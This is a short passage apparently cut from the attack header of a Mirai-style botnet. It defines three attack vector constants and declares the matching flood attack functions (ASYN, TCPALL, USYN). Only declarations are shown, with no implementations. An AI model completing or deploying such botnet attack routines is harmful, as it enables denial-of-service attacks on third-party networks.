...
#define ATK_VEC_ASYN       29
#define ATK_VEC_TCPALL     30 
#define ATK_VEC_USYN       31
...
void attack_udp_asyn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_tcpall(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_tcpusyn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
